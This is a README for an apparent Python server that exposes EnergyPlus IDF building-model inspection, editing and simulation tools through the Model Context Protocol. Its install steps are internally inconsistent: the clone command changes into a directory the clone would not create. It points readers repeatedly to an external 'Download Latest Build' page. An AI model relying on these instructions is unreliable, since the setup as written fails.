# EnergyPlus MCP Server v0.1.0 - Building Energy Simulation MCP Server 2026

> **EnergyPlus MCP Server is a Python implementation of the Model Context Protocol that provides structured tools for inspecting, changing, validating, visualizing, and simulating EnergyPlus building models in version 0.1.0.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/walkererik1991/energyplus-idf-mcp-server?style=flat-square)](https://github.com/walkererik1991/energyplus-idf-mcp-server)

---

<p align="center">
  <a href="https://walkererik1991.github.io/energyplus-idf-mcp-server/">
    <img src="https://img.shields.io/badge/Download-EnergyPlus%20MCP%20Server%20Latest-brightgreen?style=for-the-badge" alt="Download EnergyPlus MCP Server">
  </a>
</p>

> **[Download EnergyPlus MCP Server v0.1.0](https://walkererik1991.github.io/energyplus-idf-mcp-server/)**

---

[Download Latest Build](https://walkererik1991.github.io/energyplus-idf-mcp-server/)

---

## Overview

EnergyPlus MCP Server gives Model Context Protocol clients a structured interface to EnergyPlus building energy models. Through its tools, users can open, review, update, validate, and execute IDF files while working consistently with zones, surfaces, materials, schedules, and HVAC connections.

It is suited to energy modelers, building-performance practitioners, developers, and automated workflows that use MCP. In addition to simulation execution, the service supports HVAC topology inspection, output-data configuration, interactive model views, and diagrams of building systems.

---

## Capabilities

- Open, review, modify, validate, analyze, and simulate EnergyPlus IDF files.
- Provide 35 structured Model Context Protocol tools.
- Inspect zones, surfaces, materials, schedules, and HVAC component relationships.
- Execute building simulations with compatible weather files.
- Explore HVAC system topology and associated component links.
- Produce interactive visualizations of models and HVAC system diagrams.
- Set EnergyPlus output variables and output meters.
- Use either stdio or token-authenticated streamable HTTP transport.

---

## Installation

### Get the source

```bash
git clone https://github.com/walkererik1991/energyplus-idf-mcp-server.git
cd energyplus-building-server-v0.1.0
```

After cloning, install the Python dependencies specified by the project. The runtime must also be able to access an EnergyPlus installation and the weather files required for simulation.

### Run with Docker

Docker can be used to build and launch the service:

```bash
docker build -t energyplus-mcp-server .
docker run --rm -i energyplus-mcp-server
```

When using HTTP transport, publish the port defined by the project's runtime configuration and pass the authentication token required by the service.

---

## Using the Server

An MCP-compatible client can connect to EnergyPlus MCP Server through stdio or streamable HTTP.

### Stdio connection

1. Launch the server through the project's Python entry point or its container setup.
2. Add the running process to the MCP client as a server.
3. Load an IDF file and examine the objects it contains.
4. Make any required edits and validate the model.
5. Choose a compatible weather file.
6. Set the desired output variables and meters.
7. Run EnergyPlus, then review the available analysis results or visualizations.

### Streamable HTTP connection

1. Launch the service with streamable HTTP enabled.
2. Enter the server endpoint in the MCP client configuration.
3. Provide the configured authentication token.
4. Access the model inspection, editing, validation, and simulation operations over HTTP.

---

## Runtime Configuration

Configure transport and runtime behavior in the server launch command or in the Docker deployment settings. The environment generally needs the following information:

```text
Transport: stdio or streamable HTTP
Authentication: token required for streamable HTTP
EnergyPlus: installed executable and compatible runtime
Model input: IDF file
Weather input: compatible EnergyPlus weather file
Outputs: selected variables and meters
```

The Python process or container must be able to read the model and weather files and write generated simulation output to accessible locations.

---

## Requirements

- A Python runtime that supports the project's dependencies.
- An EnergyPlus installation appropriate for the models to be simulated.
- Compatible EnergyPlus weather files for simulation work.
- Access to IDF models and associated project files.
- Docker when deploying the service in a container.
- An MCP-compatible client for connecting to the available tools.
- A configured token for streamable HTTP connections.

---

## Frequently Asked Questions

### What file format is supported?

EnergyPlus MCP Server works with EnergyPlus IDF building models.

### Does the service execute simulations?

Yes. Simulations can be run when the runtime has a compatible EnergyPlus installation and weather file.

### Which parts of a model can I examine?

The tools expose information about zones, surfaces, materials, schedules, HVAC relationships, and other model data supported by the server.

### How can a client connect?

Both stdio and token-authenticated streamable HTTP transports are available.

### How are simulation outputs selected?

Before running EnergyPlus, use the output-variable and output-meter tools to choose the data to generate.

### What should I check after a failed simulation?

Verify the IDF model, confirm that its EnergyPlus version is supported, ensure the executable is available to the runtime, and check that the selected weather file meets the simulation requirements.

### Is container deployment available?

Yes. Docker can be used to deploy the server. The container must have access to the EnergyPlus runtime, model and weather files, and the locations required for output generation.

### How can I find the latest build?

Visit [Download Latest Build](https://walkererik1991.github.io/energyplus-idf-mcp-server/) for the current published build, and review the repository for project updates.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
